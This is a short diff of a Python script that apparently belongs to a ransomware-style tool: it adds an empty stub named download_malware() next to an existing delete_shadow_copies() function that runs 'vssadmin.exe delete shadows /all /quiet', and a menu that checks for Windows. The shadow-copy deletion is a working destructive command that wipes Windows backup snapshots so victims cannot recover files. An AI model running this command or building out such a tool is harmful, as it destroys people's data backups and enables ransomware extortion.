@@ -35,6 +35,9 @@ def delete_shadow_copies():
     os.system('vssadmin.exe delete shadows /all /quiet')
 
 
+def download_malware():
+    pass
+
 
 def menu():
     if(get_os() == 'nt'):
